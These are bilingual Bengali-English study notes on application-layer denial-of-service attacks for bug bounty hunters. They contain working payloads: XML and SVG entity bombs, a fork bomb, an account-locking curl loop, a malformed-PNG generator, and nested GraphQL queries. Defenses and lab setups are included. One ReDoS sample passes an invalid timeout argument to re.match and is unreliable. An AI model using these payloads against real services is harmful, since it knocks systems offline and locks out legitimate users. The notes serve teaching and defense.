# 💥 Denial of Service (DoS) — Detailed Study Notes

> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** ⚠️ DoS testing অত্যন্ত sensitive। শুধুমাত্র authorized scope এবং নিজের lab environment এ practice করো। Production system এ test করা illegal এবং unethical।

---

## 📚 Table of Contents

1. [Concept — DoS vs DDoS কী?](#1-concept--dos-vs-ddos-কী)
2. [DoS Attack Categories](#2-dos-attack-categories)
3. [Account Locking DoS](#3-account-locking-dos)
4. [File System Limit DoS](#4-file-system-limit-dos)
5. [Memory Exhaustion Attacks](#5-memory-exhaustion-attacks)
   - [XML Bomb (Billion Laughs)](#51-xml-bomb-billion-laughs)
   - [GraphQL Nested Query DoS](#52-graphql-nested-query-dos)
   - [Image Processing DoS](#53-image-processing-dos)
   - [SVG Handling DoS](#54-svg-handling-dos)
   - [ReDoS (Regex DoS)](#55-redos-regex-dos)
   - [Fork Bomb](#56-fork-bomb)
6. [App-Layer DoS Techniques (Extended)](#6-app-layer-dos-techniques-extended)
7. [Practical Lab Setup](#7-practical-lab-setup)
8. [Bug Bounty — DoS Scope Considerations](#8-bug-bounty--dos-scope-considerations)
9. [Defense Cheat Sheet](#9-defense-cheat-sheet)
10. [References](#10-references)

---

## 1. Concept — DoS vs DDoS কী?

### Denial of Service (DoS)

**DoS** = একজন attacker একটা service কে unavailable করে দেয়।

```
Normal Operation:
  User → Request → Server → Response ✅

DoS Attack:
  Attacker → 10,000 requests/sec → Server → Overwhelmed ❌
  Legitimate User → Request → Server (busy) → Timeout / Error 503
```

### DDoS (Distributed DoS)

**DDoS** = অনেক machine থেকে একসাথে attack।

```
DDoS Structure:
                        ┌─────────────┐
  Attacker ─ C2 ───────>│ Botnet PC 1 │──┐
  (Command &            ├─────────────┤  │
   Control)         ───>│ Botnet PC 2 │──┤──> Target Server
                        ├─────────────┤  │    (Flooded!)
                    ───>│ Botnet PC 3 │──┘
                        └─────────────┘

  Thousands of compromised machines → Millions of requests
```

### Application-Layer DoS (Layer 7) — Bug Bounty Focus

```
Network/Volume Based DoS:  Large traffic → Not our focus (ISP handles)
Application Layer DoS:     Smart requests → crash/slow the APP logic
                           ↑ This is what we test in bug bounty!

Examples:
  ✅ XML bomb → memory exhaustion
  ✅ ReDoS → CPU exhaustion
  ✅ Account lock → business logic DoS
  ✅ File limit → storage exhaustion
```

---

## 2. DoS Attack Categories

```
┌──────────────────────────────────────────────────────────────────┐
│                   DoS Attack Categories                          │
├────────────────────┬─────────────────────────────────────────────┤
│ Category           │ কীভাবে কাজ করে                             │
├────────────────────┼─────────────────────────────────────────────┤
│ Volume-based       │ Bandwidth flood (UDP flood, ICMP flood)     │
│ Protocol-based     │ SYN flood, Ping of Death                    │
│ Application-layer  │ HTTP flood, Slowloris                       │
│ Resource           │ CPU/Memory/Disk exhaustion                  │
│ Amplification      │ DNS amplification (small request→big resp.) │
│ Logic/Business     │ Account lock, rate limit abuse              │
└────────────────────┴─────────────────────────────────────────────┘

Bug Bounty তে focus:
  ✅ Application-layer
  ✅ Resource exhaustion (CPU/Memory/Disk)
  ✅ Logic-based (account lock)
  ❌ Volume-based (out of scope সাধারণত)
```

---

## 3. Account Locking DoS

### Concept

```
অনেক application এ security feature আছে:
  "5 বার ভুল password দিলে account lock হয়ে যাবে"

এটা brute force থেকে protect করার জন্য।
কিন্তু attacker এই feature টাকে DoS এ পরিণত করতে পারে!

Attack:
  Attacker জানে victim এর username (email/phone)
  → সে ইচ্ছাকৃতভাবে ভুল password দেয় বারবার
  → victim এর account lock হয়ে যায়!
  → Legitimate user তার নিজের account access করতে পারে না!
```

```
Attack Flow:
┌──────────────────────────────────────────────────────────┐
│                                                          │
│  Attacker                    Server                      │
│     │                           │                        │
│     │─ POST /login ────────────>│                        │
│     │  user: victim@email.com   │  Attempt 1: ❌         │
│     │  pass: wrong1             │                        │
│     │                           │                        │
│     │─ POST /login ────────────>│                        │
│     │  pass: wrong2             │  Attempt 2: ❌         │
│     │                           │                        │
│     │─ POST /login ────────────>│                        │
│     │  pass: wrong3             │  Attempt 3: ❌         │
│     │─ POST /login ────────────>│                        │
│     │  pass: wrong4             │  Attempt 4: ❌         │
│     │─ POST /login ────────────>│                        │
│     │  pass: wrong5             │  Attempt 5: ❌         │
│     │                           │                        │
│     │                           │  🔒 ACCOUNT LOCKED!    │
│                                                          │
│  Victim tries to login now:                              │
│     Victim: correct password                             │
│     Server: "Account locked. Contact support."  ❌       │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### Attack Script

```bash
# Mass account locking:
for i in {1..100}; do
  curl -s -X POST \
    -d "username=victim@email.com&password=wrong_pass_$i" \
    https://target.com/login
done

# ⚠️ SCOPE WARNING:
# এটা প্রায় সব Bug Bounty program এ OUT OF SCOPE!
# Real production এ test করলে:
#   - Legal action হতে পারে
#   - Business impact অনেক বেশি
#   - Always get written permission first!
```

### Real-World Impact Example

```
Scenario: Banking app
  - Customer এর account lock হলে সে transaction করতে পারে না
  - Emergency এ fund access করতে পারে না
  - Business reputation damage হয়
  - Support team overwhelmed হয়ে যায়

Business Impact: HIGH (Financial loss + Customer dissatisfaction)
Severity in Bug Bounty: Usually Low-Medium (if in scope)
```

---

## 4. File System Limit DoS

### Concept

```
OS এর filesystem এ maximum number of files (inodes) এর limit আছে।
Attacker যদি এই limit এ পৌঁছে দিতে পারে → server crash করে!
Error: "No space left on device" (disk full না হলেও!)
```

### Filesystem Limits

```
┌──────────────┬──────────────────────────────────────────┐
│ Filesystem   │ Maximum Files (Inodes)                   │
├──────────────┼──────────────────────────────────────────┤
│ FAT32        │ ~268 million + 4GB file size limit!      │
│ NTFS         │ ~4.2 billion (MFT entries)               │
│ EXT4         │ ~4 billion                               │
│ XFS          │ Dynamic (based on disk size)             │
│ BTRFS        │ 2^64 (~18 quintillion) — practically ∞  │
│ ZFS          │ ~281 trillion                            │
└──────────────┴──────────────────────────────────────────┘

Important:
  FAT32: 4GB file size limit!
  → আধুনিক system এ NTFS/ext4 দিয়ে replace হয়েছে

  EXT4 (Linux standard): 4 billion inodes
  → যদি server EXT4 use করে এবং inode শেষ হয় → "No space left"!
  → Disk এ space থাকলেও files create করা যাবে না!
```

### Attack Scenarios

```
Scenario 1: File Upload DoS
  Target: File upload endpoint (avatar, document upload)

  Attack: Script দিয়ে millions of tiny files upload করো
  Result: Server এর inode শেষ → নতুন file create হয় না
  Impact: App crash, database writes fail, log files fail

Scenario 2: Log File Size DoS
  Target: Logging system (error log, access log)

  Attack: Millions of requests পাঠাও যেটা error log করে
  Result: Log file এর size বাড়তে বাড়তে disk full হয়
  Impact: Database writes fail (MySQL, SQLite can't write!)

Scenario 3: SQLite Database DoS
  Target: App যেটা SQLite use করে

  Attack: Huge amount of data insert করো repeatedly
  Result: SQLite file এর size filesystem limit এ পৌঁছে যায়
  Impact: Database crash → App crash
```

```bash
# File creation DoS (Lab only!):
# নিজের VM এ test করো:

# Check current inode usage:
df -i

# Inode exhaustion test:
mkdir /tmp/inode_test
for i in $(seq 1 100000); do
  touch /tmp/inode_test/file_$i
done

# Check after:
df -i
# যখন Use% = 100% → "No space left on device"!

# Log flooding (controlled):
for i in {1..10000}; do
  curl -s "http://localhost/nonexistent_page_$i" > /dev/null
done
# → Server log fill up হবে
```

---

## 5. Memory Exhaustion Attacks

### 5.1 XML Bomb (Billion Laughs Attack)

#### Concept — কীভাবে কাজ করে?

```
XML Entity একটা variable এর মতো যেটা XML এর মধ্যে reuse করা যায়।
Attacker এটাকে exponentially expand করতে পারে!
```

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!-- lol = "lol" (3 bytes) -->

  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!-- lol1 = lol×10 = "lollollollollollollollollollol" (30 bytes) -->

  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!-- lol2 = lol1×10 = 300 bytes -->

  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- lol3 = 3,000 bytes = 3 KB -->

  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- lol4 = 30,000 bytes = 30 KB -->

  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!-- lol5 = 300,000 bytes = 300 KB -->

  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!-- lol6 = 3,000,000 bytes = 3 MB -->

  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!-- lol7 = 30 MB -->

  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!-- lol8 = 300 MB -->

  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  <!-- lol9 = 3,000 MB = ~3 GB! -->
]>
<lolz>&lol9;</lolz>
<!-- এই ছোট্ট file টা parse করতে গেলে 3GB+ memory লাগে! -->
```

```
Expansion Calculation:
  lol   = 3 bytes
  lol1  = 3 × 10    = 30 bytes
  lol2  = 30 × 10   = 300 bytes
  lol3  = 300 × 10  = 3,000 bytes
  lol4  = 3KB × 10  = 30 KB
  lol5  = 30KB × 10 = 300 KB
  lol6  = 300KB× 10 = 3 MB
  lol7  = 3MB × 10  = 30 MB
  lol8  = 30MB × 10 = 300 MB
  lol9  = 300MB× 10 = 3,000 MB ≈ 3 GB!

  File size: ~1 KB → Memory needed: 3 GB!
  Ratio: 3,000,000:1 compression ratio!
```

#### কোথায় Test করবে?

```
XML input accept করে এমন endpoints:
  ✅ SOAP API endpoints
  ✅ XML file upload (docx, xlsx, svg, sitemap.xml)
  ✅ RSS/Atom feed parsers
  ✅ SVG file processors
  ✅ Office document processors (LibreOffice, Word server-side)
  ✅ API যেটা Content-Type: application/xml accept করে
```

```bash
# Test করো:
curl -X POST https://target.com/api/parse-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "test">]><test>&xxe;</test>'
# → যদি entity expand হয় → XML bomb vulnerable!
```

---

### 5.2 GraphQL Nested Query DoS

#### Concept

```
GraphQL এ relationships এর মাধ্যমে deeply nested queries করা যায়।
Server এই nested structure resolve করতে গেলে exponential work করে!
```

```graphql
# Normal query:
query {
  user(id: 1) {
    name
    email
  }
}

# DoS query — deeply nested:
query {
  repository(owner:"rails", name:"rails") {
    assignableUsers(first: 100) {         # 100 users
      nodes {
        repositories(first: 100) {        # প্রতিটায় 100 repos = 10,000
          nodes {
            assignableUsers(first: 100) { # প্রতিটায় 100 users = 1,000,000!
              nodes {
                repositories(first: 100) {# 100,000,000 repos!!!
                  nodes {
                    # আরো nested করো...
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```
Query Complexity:
  Level 1: 100 users
  Level 2: 100 × 100 = 10,000 repos
  Level 3: 10,000 × 100 = 1,000,000 users
  Level 4: 1,000,000 × 100 = 100,000,000 repos!

  Server must resolve ALL of these → Memory + CPU explosion!
```

#### Real-World GraphQL DoS Techniques

```graphql
# Technique 1: Introspection + Fragments loop
query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
              fields {
                name
              }
            }
          }
        }
      }
    }
  }
}

# Technique 2: Array flooding
mutation {
  createPost(
    title: "AAAA...AAAA" # 1MB string
    content: "BBBB...BBBB" # 1MB string
    tags: ["tag1", "tag2", ..., "tag10000"] # 10K tags
  ) {
    id
  }
}

# Technique 3: Alias flooding (bypasses depth limit)
query {
  a1: user(id:1) { name }
  a2: user(id:1) { name }
  a3: user(id:1) { name }
  # ... 10000 aliases
}
```

---

### 5.3 Image Processing DoS

#### Concept

```
Server-side image processing (resize, compress, convert) expensive operation।
Specially crafted image দিয়ে server কে crash করা যায়।
```

```
Attack Techniques:

1. Pixel Bomb (Image Decompression Attack):
   একটা heavily compressed image যেটা decompress করলে বিশাল হয়

   Example: 1KB PNG → decompress → 1GB of pixels!
   (কারণ PNG lossless compression করে)

   Width: 65535 px
   Height: 65535 px
   Colors: 32-bit
   Total: 65535 × 65535 × 4 bytes ≈ 17 GB RAM!

2. Malformed Header Attack:
   Image header এ abnormal values দাও:
   - Negative width/height
   - Extremely large dimensions (width: 999999999)
   - Invalid color depth

   Vulnerable parsers (ImageMagick, PIL/Pillow, GD) crash করে!

3. ImageMagick "ImageTragick" (CVE-2016-3714):
   Malicious image → Command execution!
   (DoS + RCE possible)
```

```bash
# ImageMagick DoS test — abnormal size image:
# Python দিয়ে malformed PNG header বানাও:
python3 << 'EOF'
import struct, zlib

def create_png_chunk(chunk_type, data):
    chunk_len = struct.pack('>I', len(data))
    chunk_data = chunk_type + data
    crc = struct.pack('>I', zlib.crc32(chunk_data) & 0xffffffff)
    return chunk_len + chunk_data + crc

# PNG signature
png_sig = b'\x89PNG\r\n\x1a\n'

# IHDR: width=99999999, height=99999999 (malformed!)
width = 99999999
height = 99999999
bit_depth = 8
color_type = 2  # RGB
ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 0, 0, 0)
ihdr = create_png_chunk(b'IHDR', ihdr_data)

# Minimal IDAT and IEND
idat = create_png_chunk(b'IDAT', zlib.compress(b'\x00' * 10))
iend = create_png_chunk(b'IEND', b'')

with open('/tmp/bomb.png', 'wb') as f:
    f.write(png_sig + ihdr + idat + iend)

print("Malformed PNG created: /tmp/bomb.png")
EOF
```

---

### 5.4 SVG Handling DoS

```
SVG = XML-based format!
তার মানে SVG file এ XML bomb embed করা যায়!
```

```xml
<!-- malicious.svg -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&lol9;</text>
</svg>
```

```
কোথায় upload করবে:
  ✅ Profile picture upload (যদি SVG accept করে)
  ✅ Document upload (SVG, XML)
  ✅ Icon/Logo upload
  ✅ Any endpoint that processes SVG server-side

Impact: Server-side SVG renderer → OOM (Out of Memory) crash!
```

---

### 5.5 ReDoS (Regex Denial of Service)

#### Concept — Catastrophic Backtracking

```
কিছু Regular Expression pattern এ "catastrophic backtracking" হয়।
Input এর size বাড়লে processing time exponentially বাড়ে!
```

```
Normal Regex matching:
  Input: "aaaa" → Pattern: /a+/ → O(n) time

Catastrophic Backtracking:
  Input: "aaaaaX" → Pattern: /(a+)+$/ → O(2^n) time!!!

  কেন? Regex engine different ways তে try করে:
  "a"+"aaaa" → fail
  "aa"+"aaa" → fail
  "aaa"+"aa" → fail
  "aaaa"+"a" → fail
  ... exponential combinations!
```

#### Vulnerable Regex Patterns

```python
# ❌ VULNERABLE PATTERNS (ReDoS):

# Pattern 1: Nested quantifiers
re.match(r'(a+)+$', 'a' * 30 + 'X')
# 30 chars → takes minutes!

# Pattern 2: Alternation with overlap
re.match(r'(a|aa)+$', 'a' * 25 + 'X')

# Pattern 3: Email validation (common real-world example!)
re.match(r'^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$', 'a' * 50 + '@')
# Real email validation regex → ReDoS!

# Test করো:
import time, re

pattern = r'(a+)+$'
payload = 'a' * 40 + 'X'

start = time.time()
try:
    re.match(pattern, payload, timeout=5)
except Exception as e:
    print(f"Timeout or error: {e}")
elapsed = time.time() - start
print(f"Time: {elapsed:.2f}s")
# → বহু seconds লাগবে!
```

#### Real-World ReDoS Examples

```
CVE-2019-16935: Python xml.etree.ElementTree ReDoS
CVE-2021-27290: npm package 'ua-parser-js' ReDoS
CVE-2022-25887: sanitize-html npm package ReDoS
Node.js email validation libraries: অনেকগুলোই vulnerable!

Test tool:
  - https://regex101.com (catastrophic backtracking detector)
  - npm: safe-regex package

Finding ReDoS:
  1. App এ user input accept করে এমন field খোঁজো
     (email, username, phone number, URL)
  2. অনেক characters দিয়ে input পাঠাও:
     "a" * 100 + "!" or "aaaa...aaaa@"
  3. Response time measure করো
  4. Input length বাড়ালে time exponentially বাড়ে? → ReDoS!
```

---

### 5.6 Fork Bomb

#### Concept

```bash
:(){ :|:& };:

# এটা কী?
# :  → function নাম (colon)
# () → function define করছি
# {  → function body শুরু
#   : → নিজেকে call করো
#   | → pipe (output পাঠাও)
#   : → আরেকটা instance
#   & → background এ চালাও (wait করো না)
# } → function body শেষ
# ; → separator
# : → function call করো (trigger!)

# Expansion:
#   : calls itself TWICE, each in background
#   Each of those calls TWICE again
#   Exponential process creation!
#   2 → 4 → 8 → 16 → 32 → ... → System Crash!
```

```
Process Tree:
  :
  ├── : (background)
  │   ├── : (background)
  │   │   ├── :
  │   │   └── :
  │   └── : (background)
  │       ├── :
  │       └── :
  └── : (background)
      ├── ...
      └── ...

  In seconds: thousands of processes → RAM full → System unresponsive!
```

```bash
# Safe equivalent for learning:
# নিজের VM তে test করার আগে:
ulimit -u 100  # max 100 processes এ limit করো!
               # তারপর fork bomb safe থাকবে

# Check current process limit:
ulimit -u

# Safe test (VM এ, সাথে ulimit):
ulimit -u 50  # limit to 50 processes
:(){ :|:& };:
# System কিছুটা slow হবে কিন্তু crash করবে না

# Windows equivalent:
# %0|%0  (batch file এ)
# PowerShell: while(1){Start-Process powershell}
```

⚠️ **Warning:** Fork bomb শুধুমাত্র নিজের isolated VM এ test করো। Production বা shared system এ never!

---

## 6. App-Layer DoS Techniques (Extended)

### HTTP Slow Attack (Slowloris)

```
Concept:
  - Web server HTTP connection টা complete না হওয়া পর্যন্ত open রাখে
  - Slowloris: headers একটু একটু করে পাঠায়, কখনো complete হয় না
  - Server সব connections hold করে → legitimate users block!

Attack:
  Normal HTTP: Headers → Body → Done (fast)
  Slowloris:   GET / HTTP/1.1\r\n
               Host: target.com\r\n
               (10 second pause)
               X-Header: value\r\n
               (10 second pause)
               X-Another: value\r\n
               ... never ends!

  Apache/nginx এর connection limit শেষ হয়ে যায়!
```

### Hash Collision DoS

```
কিছু language এ hash table implementation এ collision attack possible:
  - PHP, Java, Python (old versions)
  - Attacker এমন keys পাঠায় যেগুলো সব একই hash bucket এ পড়ে
  - O(1) lookup → O(n²) হয়ে যায়!

PHP example:
  POST /form এ হাজার হাজার এমন keys পাঠাও যেগুলো same hash
  PHP array insertion → exponentially slow
```

### Large File Upload DoS

```bash
# যদি file size limit না থাকে:
dd if=/dev/zero of=/tmp/huge.txt bs=1M count=10000
# 10GB file তৈরি করো

curl -X POST -F "file=@/tmp/huge.txt" https://target.com/upload
# → Server disk full!
# → Other processes fail!
```

---

## 7. Practical Lab Setup

### Lab 1: XML Bomb — নিজে test করো

```bash
# Vulnerable PHP XML parser:
mkdir /var/www/html/dos-lab
cat > /var/www/html/dos-lab/xml-parse.php << 'EOF'
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml_data = file_get_contents('php://input');
    // ❌ VULNERABLE: external entities enabled
    $xml = simplexml_load_string($xml_data);
    if ($xml) {
        echo "Parsed successfully: " . $xml->getName();
    }
}
?>
EOF

# Normal test:
curl -X POST http://localhost/dos-lab/xml-parse.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>hello</test>'

# XML bomb test (CAREFUL — use small version first!):
curl -X POST http://localhost/dos-lab/xml-parse.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<test>&lol3;</test>'
# শুধু lol3 → 3KB expand (safe for testing!)
```

### Lab 2: ReDoS Test

```python
# redos_test.py
import re
import time

# Test different regex patterns:
patterns = [
    (r'(a+)+$', 'Nested quantifier'),
    (r'(a|aa)+$', 'Alternation overlap'),
    (r'^(a+)*$', 'Star nested'),
]

# Test with increasing input lengths:
for pattern, name in patterns:
    print(f"\n[*] Testing: {name} → {pattern}")
    for length in [10, 20, 30, 35]:
        payload = 'a' * length + 'X'
        start = time.time()
        try:
            result = re.match(pattern, payload)
        except Exception as e:
            print(f"  len={length}: ERROR - {e}")
            break
        elapsed = time.time() - start
        print(f"  len={length}: {elapsed:.4f}s {'⚠️ SLOW!' if elapsed > 1 else '✅'}")
        if elapsed > 5:
            print("  → CRITICAL: ReDoS confirmed!")
            break
```

```bash
python3 redos_test.py
# Output দেখো — কোন length এ time exponentially বাড়ে?
```

### Lab 3: Inode Exhaustion

```bash
# নিজের VM তে:

# Step 1: Current inode status:
df -i /

# Step 2: Test directory তৈরি করো:
mkdir /tmp/inode_dos_test

# Step 3: Many small files তৈরি করো:
echo "Creating 50,000 files..."
for i in $(seq 1 50000); do
  touch /tmp/inode_dos_test/f_$i
done

# Step 4: After:
df -i /
echo "Files created: $(ls /tmp/inode_dos_test | wc -l)"

# Step 5: Cleanup:
rm -rf /tmp/inode_dos_test
```

---

## 8. Bug Bounty — DoS Scope Considerations

### ⚠️ Critical Rules

```
Before testing ANY DoS:

Rule 1: Program এর scope পড়ো
  "DoS attacks are out of scope" → TEST করো না!
  "Application-level DoS is in scope" → Carefully test

Rule 2: Impact assessment
  Real user affect হবে? → Production এ test করো না
  Isolated test করা possible? → Staging/sandbox use করো

Rule 3: Written permission
  Pentest engagement এ → Written authorization নাও
  Bug bounty → Program rules follow করো

Rule 4: Responsible disclosure
  PoC দেখাও কিন্তু actual DoS cause করো না
  "I found that X input causes exponential memory usage..."
  → Show timing test, don't actually crash production
```

### DoS Severity in Bug Bounty

```
Severity Assessment:

🔴 High/Critical:
  → Single request দিয়ে server crash করা যায়
  → XML bomb (unauthenticated endpoint)
  → ReDoS on high-traffic endpoint

🟠 Medium:
  → Account locking (targeted user)
  → Authenticated user only DOS
  → Rate limited endpoint DoS

🟡 Low:
  → Self-DoS (শুধু নিজের account affect)
  → Requires many requests (not efficient)
  → Minimal business impact

🔵 Informational / Out of Scope (usually):
  → Network-level flooding
  → Requires physical access
  → DDoS scenarios
```

### PoC Template for Bug Bounty Report

```markdown
## Vulnerability: [XML Bomb / ReDoS / etc.] in [Endpoint]

**Severity:** High
**Endpoint:** POST /api/parse-document

### Summary

[একটা authenticated/unauthenticated request দিয়ে server কে
memory exhaustion এ নিয়ে যাওয়া সম্ভব]

### Steps to Reproduce

1. POST /api/parse-document এ নিচের XML পাঠাও:
   [PoC payload — small version যেটা memory growth দেখায়]

2. Server memory monitor করো (before: X MB, after: Y MB)

3. Response time compare করো:
   Normal input: 50ms
   Malicious input: 5000ms (100x slower)

### Impact

- Server crash possible with single request
- All users affected during attack
- No authentication required

### Recommendation

[Fix suggestion]
```

---

## 9. Defense Cheat Sheet

```
Attack Type              → Fix
────────────────────────────────────────────────────────────────────────
Account Locking DoS      → Rate limit by IP + account age
                           CAPTCHA after 3 failed attempts
                           Lock duration: progressive (5min, 15min, 1hr)

XML Bomb                 → Disable external entities (XXE + bomb fix)
                           Set max entity expansion limit
                           Use safe XML parsers:
                             Python: defusedxml library
                             PHP: LIBXML_NOENT disable করো
                             Java: SAXParserFactory restrictions

GraphQL Nested Query     → Query depth limit (max depth = 5-10)
                           Query complexity limit
                           Timeout per query
                           Use graphql-depth-limit library

Image Processing DoS     → Validate image dimensions BEFORE processing
                           Set max width/height (e.g., 10000px)
                           Use timeout for image processing
                           Sandboxed processing environment

SVG DoS                  → SVG তে XML entity disable করো
                           Use sanitizer (DOMPurify for server-side)
                           Whitelist allowed SVG elements

ReDoS                    → Use safe regex patterns
                           Test with regex101.com
                           npm: safe-regex, re2
                           Set timeout for regex matching
                           Input length limit

Fork Bomb                → ulimit on processes: ulimit -u 100
                           cgroups for container isolation
                           systemd service restrictions

File System DoS          → ulimit on file creation per process
                           Upload size limits
                           Quota per user
                           Log rotation (logrotate)
```

### Safe XML Parsing (Python)

```python
# ❌ VULNERABLE:
import xml.etree.ElementTree as ET
tree = ET.fromstring(user_xml_input)  # XML bomb vulnerable!

# ✅ SAFE: defusedxml library
import defusedxml.ElementTree as ET
try:
    tree = ET.fromstring(user_xml_input)
    # defusedxml automatically:
    # - Blocks external entities
    # - Limits entity expansion
    # - Prevents XML bomb
except ET.EntitiesForbidden:
    return "External entities not allowed", 400
except Exception as e:
    return "Invalid XML", 400
```

### GraphQL Depth Limit (Node.js)

```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity')
const depthLimit = require('graphql-depth-limit')

const app = express()
app.use(
  '/graphql',
  graphqlHTTP({
    schema,
    validationRules: [
      depthLimit(5), // Max depth = 5
      createComplexityLimitRule(1000), // Max complexity = 1000
    ],
    // Query timeout:
    context: { timeout: 5000 }, // 5 second max
  }),
)
```

---

## 10. References

| Resource                                 | Link                                                                                            |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings                     | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Denial%20of%20Service) |
| OWASP DoS Cheat Sheet                    | [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)      |
| DEF CON 32 — Practical DoS in Bug Bounty | [YouTube](https://youtu.be/b7WlUofPJpU)                                                         |
| Billion Laughs Wikipedia                 | [Wikipedia](https://en.wikipedia.org/wiki/Billion_laughs_attack)                                |
| ReDoS — OWASP                            | [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)   |
| defusedxml (Python)                      | [PyPI](https://pypi.org/project/defusedxml/)                                                    |
| graphql-depth-limit                      | [npm](https://www.npmjs.com/package/graphql-depth-limit)                                        |
| Interactsh (OOB tool)                    | [GitHub](https://github.com/projectdiscovery/interactsh)                                        |

---

> ✅ **Next Topic Suggestions:**
>
> - `XXE Injection/README.md` — XML bomb এর সাথে directly related (XXE + DoS)
> - `GraphQL Injection/README.md` — GraphQL DoS এর full context
> - `Regular Expression/README.md` — ReDoS এর detailed study
> - `Race Condition/README.md` — Account lock bypass + logic DoS

> ⚠️ **Final Reminder:** DoS attacks production system এ test করা সবচেয়ে dangerous। সবসময় staging environment বা sandbox এ test করো। Bug bounty তে always scope verify করো।
